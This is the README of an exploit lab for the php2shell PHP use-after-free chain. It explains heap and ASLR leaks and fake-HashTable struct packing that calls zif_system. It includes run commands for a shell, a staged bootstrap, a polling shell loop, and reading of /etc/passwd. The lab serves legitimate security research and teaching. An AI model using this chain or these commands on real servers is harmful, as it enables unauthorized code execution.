<div align="center">

# php2shell: Exploitable Lab

**CVE-2026-109618 · CVE-2026-109619 · PHP 5.4 – 8.5.11**

A two-container lab that reproduces php2shell end to end: one vulnerable PHP 8.4.26 target, one patched 8.4.27 control, and a proof-of-concept that lands a shell as `www-data`.

[![PHP](https://img.shields.io/badge/PHP-8.4.26%20%2F%208.4.27-777BB4?logo=php&logoColor=white)](#the-two-images)
[![Docker](https://img.shields.io/badge/Docker-Compose-2496ED?logo=docker&logoColor=white)](#quick-start)
[![CVE](https://img.shields.io/badge/CVE-2026--109618%20%7C%20CVE--2026--109619-critical-red)](#vulnerability-summary)
[![Write-up](https://img.shields.io/badge/write--up-php2shell-8A2BE2)](https://squidhacker.com/2026/11/php2shell-deep-technical-breakdown-docker-lab/)

</div>

---

> ## ⚠️ Authorized use only
>
> This lab contains a deliberately vulnerable container and working exploit
> tooling. Everything binds to `127.0.0.1` and the driver refuses non-loopback
> targets. Use it on hosts you own or have written permission to test. Do not
> deploy it anywhere reachable from the internet, and do not point it at
> infrastructure you do not control.

---

## Contents

- [Vulnerability summary](#vulnerability-summary)
- [Why this is not an application bug](#why-this-is-not-an-application-bug)
- [Quick start](#quick-start)
- [Getting a shell](#getting-a-shell)
- [How the exploit works](#how-the-exploit-works)
- [What is actually vulnerable](#what-is-actually-vulnerable)
- [Preconditions this lab makes easy](#preconditions-this-lab-makes-easy)
- [Expected results](#expected-results)
- [Repository layout](#repository-layout)
- [Troubleshooting](#troubleshooting)
- [Further reading](#further-reading)
- [License](#license)

---

## Vulnerability summary

| Field | Detail |
|---|---|
| **Severity** | 9.2 Critical (CVSS 4.0), both issues |
| **Weakness** | [CWE-416](https://cwe.mitre.org/data/definitions/416.html) Use After Free · [CWE-824](https://cwe.mitre.org/data/definitions/824.html) Access of Uninitialized Pointer |
| **Affected** | PHP 5.4 through 8.5.11 |
| **Fixed in** | 8.2.35 · 8.3.36 · 8.4.27 · 8.5.12 |
| **CVE** | CVE-2026-109618 (OOM bailout) · CVE-2026-109619 (stale state) |
| **Advisories** | [GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w) · [GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp) |
| **Upstream fix** | [php-src commit 3584a98](https://github.com/php/php-src/commit/3584a98bda0f2c0d367255b046798b0d3a221a19) |
| **Exploitation** | In CISA KEV since 2026-10-26 |
| **Pre-auth** | Yes, fires during `php_request_startup()` |

Two bugs in PHP's own request startup, chained:

1. **The abort.** Out-of-memory handling raises a fatal error and `longjmp()`s
   out of whatever it was doing. If that happens while request state is
   reachable but not yet consistent, the jump skips the cleanup that would have
   kept it consistent.
2. **The leftovers.** Some request-owned state is published into worker globals
   and not fully cleared, so the next request on that worker reads freed memory
   before normal initialization replaces it.

---

## Why this is not an application bug

The target application is three lines that print a banner:

```php
<?php
header('Content-Type: text/plain; charset=utf-8');
echo "php2shell lab target\n";
echo 'php_version=' . PHP_VERSION . "\n";
```

No `session_start()`, no upload handling, no `include`, no `unserialize()`, no
database, no third-party code. **The exploit never executes that file.** It runs
and finishes inside `php_request_startup()`, before PHP compiles the script.

That is the point of the lab: your framework's authentication, your application
WAF rules, your input validation. All downstream of this. There is no
application-layer mitigation.

---

## Quick start

Requirements: Docker with Compose v2, Python 3, and `git` (the driver fetches
the pinned research implementation).

```bash
git clone https://github.com/SquidSec/php2shell.git
cd php2shell

# vulnerable target on 127.0.0.1:18080
docker compose up -d --build vulnerable

# patched control on 127.0.0.1:18081
docker compose --profile patched up -d --build patched
```

Wait for the target to answer, then confirm it is the version you expect:

```bash
curl -s http://127.0.0.1:18080/
# php2shell lab target
# php_version=8.4.26
```

Build once, then start. Rebuilding the image underneath a running container
changes the heap layout the chain is calibrated against.

---

## Getting a shell

Two entry points, same options. `run.sh` builds and starts the target, then
passes every trailing argument through to `rce.py`.

```bash
./poc/run.sh                                  # probe + proof of `id`
./poc/run.sh --cmd "uname -a"                 # any command, any length
./poc/run.sh --shell                          # persistent shell
./poc/run.sh --shell --shell-cmd "id"         # run commands in that shell
./poc/run.sh patched                          # patched control: expect nothing
```

Or drive the chain directly:

```bash
python3 poc/probe.py --target http://127.0.0.1:18080/
CONTAINER=php2shell-vulnerable PORT=18080 python3 poc/rce.py --shell
```

### Interactive shell

```console
$ ./poc/rce.py --shell
[*] zif_system=0x465370 zval_ptr_dtor=0x65eb60 (readelf)
[*] starting the persistent shell on the target
[*] shell attached. Type 'exit' or Ctrl-D to detach.

php2shell> id; hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
php2shell-vulnerable
php2shell> ls /var/www/html
index.php
```

### One-off commands

```console
$ ./poc/rce.py --cmd "id; uname -a; cat /etc/passwd | head -3"
============================================================
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Linux php2shell-vulnerable 6.18.54.1 ... x86_64 GNU/Linux
root:x:0:0:root:/root:/bin/bash
============================================================
```

### Patched control

```console
$ ./poc/rce.py --container php2shell-patched --port 18081 --shell
============================================================
NO SHELL: the payload did not start on this target.
On the patched image this is the expected result.
============================================================
```

---

## How the exploit works

Three stages. Each maps to a different detection opportunity.

### Stage 1: leak the heap

Request A primes the worker: a body over `max_input_vars` makes PHP emit a
warning, which with `display_errors=On` sends headers early. A one-byte
`PHPSESSID` then makes the session layer mint a new id and set `send_cookie`,
and the cookie send fails because headers are already gone. The request
finishes with a large allocation that aborts it, leaving `PS(id)` dangling.

Request B reclaims that freed block with a forged `zend_string` header whose
declared length is far larger than the block. PHP URL-encodes the string into
`Set-Cookie`, walking past the end and returning adjacent heap bytes:

```console
[+] chunk base = 0x7615a0a00000
```

### Stage 2: leak the code base

Same primitive, aimed differently: the overread window is shaped to carry a
function pointer out of a live 56-byte HashTable. Subtract the known
`zval_ptr_dtor` offset and you have the load address of `libphp.so`:

```console
[+] libphp base = 0x7615a2741000
```

Both leaks are ASLR defeats costing a few HTTP requests and no crash.

### Stage 3: turn the cleanup into a call

A session reference that survived an aborted request is reclaimed with attacker
bytes describing a fake `HashTable` whose destructor is `zif_system`, plus a
fake `execute_data` supplying the command as argument one:

```python
/* fake HashTable the cleanup will walk */
struct.pack_into("<II", ht, 0x00, 1, 7)              /* gc: rc=1, IS_ARRAY  */
struct.pack_into("<II", ht, 0x08, 0x10, 0xFFFFFFF8)  /* flags, nTableMask   */
struct.pack_into("<Q",  ht, 0x10, htdata + 0x20)     /* arData              */
struct.pack_into("<Q",  ht, 0x30, zif_system)        /* pDestructor         */

/* fake execute_data at arData+0x20 */
struct.pack_into("<I", ht, E + 0x2C, 1)              /* num_args = 1        */
struct.pack_into("<Q", ht, E + 0x50, arg1)           /* arg1 = our command  */
struct.pack_into("<I", ht, E + 0x58, 6)              /* IS_STRING           */
```

A request triggers session cleanup. `zval_ptr_dtor` sees a reference, destroys
the fake array, `zend_hash_destroy` reads `pDestructor`, and calls it with the
fake frame. The frame says one string argument, and that string is your command.

### Why the driver uses a bootstrap

The dispatch hands a single string to `zif_system`, and that string is capped at
about **14 bytes**. Anything longer is truncated before it reaches the shell, so
`cat /etc/passwd` cannot be passed through directly.

The driver therefore stages the payload inside the container at `/out/c` and
fires the 11-byte bootstrap:

```bash
bash /out/c
```

Staging uses `docker exec`, because the lab already gives you container access.
The *execution* still happens through the vulnerability. On a real engagement
you would plant that file with the first successful RCE and reuse the chain only
to run it.

### Why the shell is a polling loop

The call is one-shot: the worker's heap is corrupt immediately afterwards, so
the child dies with it and there is no stdin to attach to. `--shell` starts a
detached reader that outlives the worker:

```bash
setsid bash /out/loop.sh > /out/shell 2>&1
```

The loop polls `/out/in` for new lines, runs each one, and appends output to
`/out/shell`.

Two simpler designs were tried and both race. A FIFO closes at EOF, so it serves
exactly one command. `tail -f` can hand bash a half-written line, producing
`syntax error near unexpected token '('`. Polling on line count avoids both.

The shell runs as the web user, because that is who the exploit is.

---

## What is actually vulnerable

Five files decide everything, and the application is not one of them:

| Layer | File | Role |
|---|---|---|
| Engine | `main/rfc1867.c`, `main/main.c`, `Zend/zend_alloc.c` | the vulnerability |
| Config | [`php.ini`](php.ini) | the size mismatch the parser trips over |
| Pool | [`apache/prefork-single.conf`](apache/prefork-single.conf) | one worker, so corrupted state is reused |
| Images | [`Dockerfile`](Dockerfile), [`Dockerfile.patched`](Dockerfile.patched) | pinned vulnerable / fixed builds |
| App | [`app/index.php`](app/index.php) | prints a banner; never executed by the exploit |

The size mismatch is the interesting part. A multipart part can carry unlimited
headers, and PHP stores each as name/value strings, so the in-memory cost is far
above the wire cost. In this lab, 400,000 copies of a three-byte header line,
**1.2 MB on the wire**, exhausts an 8 MB parser budget:

```console
$ python3 poc/probe.py --target http://127.0.0.1:18080/
target        http://127.0.0.1:18080/
wire body     1,200,091 bytes
header lines  400,000
status        HTTP 200
body bytes    147

RESULT: PHP aborted inside the request parser.
        The response contains only the fatal error; the target
        script never executed. That is the pre-auth property.
```

Note the status code: **200**, not 500. With `display_errors=On` the fatal error
is rendered into the body and Apache has already committed headers. Whether the
script produced output is the signal, not the status code.

---

## Preconditions this lab makes easy

The lab is not a drop-in remote exploit. Be explicit about this:

| Precondition | Lab | Typical server |
|---|---|---|
| SAPI | Apache `mod_php` (prefork) | often PHP-FPM behind nginx |
| Worker pool | exactly 1 | usually 5–150 |
| `memory_limit` | 8 MB | 128 MB or more |
| `display_errors` | On | usually Off |
| `session.upload_progress` | On (PHP default) | On unless disabled |
| `post_max_size` | 512 MB | usually 8 MB |

The chain needs the producer and the consumer on the same worker. One worker
makes that deterministic; wider pools need worker-saturation strategies that are
out of scope here.

`display_errors=On` is a *delivery* setting for the disclosure stage. The state
corruption happens with it off; you lose the HTTP channel that carries the
leaked pointer back.

---

## Expected results

| Target | Probe | `--cmd` | `--shell` |
|---|---|---|---|
| `php:8.4.26-apache` | parser aborts, script never runs | `uid=33(www-data)` | interactive session as `www-data` |
| `php:8.4.27-apache` | script runs normally | `NO OUTPUT` | `NO SHELL` |

The chain retries stage 3, because each attempt costs a worker and landing is
heap-dependent. Expect a handful of attempts before success.

The worker count after a successful run is **0**. The exploited child aborts, by
design. That is not a failure.

---

## Repository layout

```
php2shell/
├── Dockerfile                 # FROM php:8.4.26-apache  (last vulnerable 8.4)
├── Dockerfile.patched         # FROM php:8.4.27-apache  (first fixed 8.4)
├── docker-compose.yml         # :18080 vulnerable, :18081 patched, loopback only
├── php.ini                    # 8M memory_limit, 512M post_max_size
├── apache/
│   └── prefork-single.conf    # exactly one worker
├── app/
│   └── index.php              # prints a banner; the exploit never executes it
└── poc/
    ├── probe.py               # demonstrates the pre-auth abort, no exploit
    ├── rce.py                 # drives the chain; reads offsets from the container
    └── run.sh                 # one command end to end
```

---

## Troubleshooting

**`NO PROOF` / `NO SHELL` on the vulnerable image.** Usually heap layout. Run it
again. Stage 3 is probabilistic. If it never lands, rebuild from a clean state:

```bash
docker compose --profile patched down --rmi local --volumes
docker compose up -d --build vulnerable
```

**`cannot resolve symbols ... (no readelf, no profile)`.** The driver reads
`zif_system` and `zval_ptr_dtor` from `libphp.so` with `readelf`, falling back
to pinned offsets for 8.4.26 and 8.4.27. On another build, add its offsets or
install `binutils` in the image.

**Everything stopped working after a rebuild.** Rebuilding while a container is
running replaces the image layer beneath it and shifts the heap. Tear down, then
start fresh.

**Port already in use.** Change the published ports in `docker-compose.yml`,
then pass `--port` to the driver.

---

## Further reading

- [The full technical write-up](https://squidhacker.com/2026/11/php2shell-deep-technical-breakdown-docker-lab/): root cause, the patch,
  the SAPI matrix, and detection guidance
- [GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w): CVE-2026-109618
- [GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp): CVE-2026-109619
- [php-src commit 3584a98](https://github.com/php/php-src/commit/3584a98bda0f2c0d367255b046798b0d3a221a19): "Avoid state corruption via bailout"
- [9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp): public research implementation the driver fetches at a pinned commit

---

## License

MIT. See [LICENSE](LICENSE).

The exploit chain itself is not included or redistributed. `poc/rce.py` fetches
[9bie/php2shell-bypass-aslr-exp](https://github.com/9bie/php2shell-bypass-aslr-exp)
at a pinned commit and applies two documented fixes at runtime. That research
carries its own terms; respect them.
